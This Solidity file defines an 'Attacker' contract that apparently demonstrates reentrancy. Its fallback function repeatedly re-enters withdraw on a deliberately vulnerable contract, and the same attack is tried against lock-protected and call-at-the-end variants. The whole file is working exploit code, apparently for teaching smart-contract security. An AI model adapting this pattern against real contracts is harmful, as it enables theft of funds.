// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

import { ReentrantVulnerable } from "./ReentrantVulnerable.sol";
import { ReentrantInvulnerable } from "./ReentrantInvulnerable.sol";

contract Attacker {

    ReentrantVulnerable private reentrantVulnerable;
    ReentrantInvulnerable private reentrantInvulnerable;
    bool private isVulnerableAttack;
    bool private isInvulnerableAttackLock;
    bool private isInvulnerableAttack;

    constructor(address _reentrantVulnerable, address _reentrantInvulnerable) {
        reentrantVulnerable = ReentrantVulnerable(_reentrantVulnerable);
        reentrantInvulnerable = ReentrantInvulnerable(_reentrantInvulnerable);
    }

    function attackVulnerable() external payable {
        isVulnerableAttack = true;
        reentrantVulnerable.deposit{ value: msg.value }();
        reentrantVulnerable.withdraw(msg.value);
        isVulnerableAttack = false;
    }

    function attackInvulnerable() external payable {
        isInvulnerableAttack = true;
        reentrantInvulnerable.deposit{ value: msg.value }();
        reentrantInvulnerable.withdrawWithCallAtTheEnd(msg.value);
        isInvulnerableAttack = false;
    }

    function attackInvulnerableLock() external payable {
        isInvulnerableAttackLock = true;
        reentrantInvulnerable.deposit{ value: msg.value }();
        reentrantInvulnerable.withdrawWithLock(msg.value);
        isInvulnerableAttackLock = false;
    }

    fallback() external payable {
        if (isVulnerableAttack) {
            reentrantVulnerable.withdraw(msg.value);
        } else if (isInvulnerableAttack) {
            reentrantInvulnerable.withdrawWithCallAtTheEnd(msg.value);
        } else if (isInvulnerableAttackLock) {
            reentrantInvulnerable.withdrawWithLock(msg.value);
        }
    }

}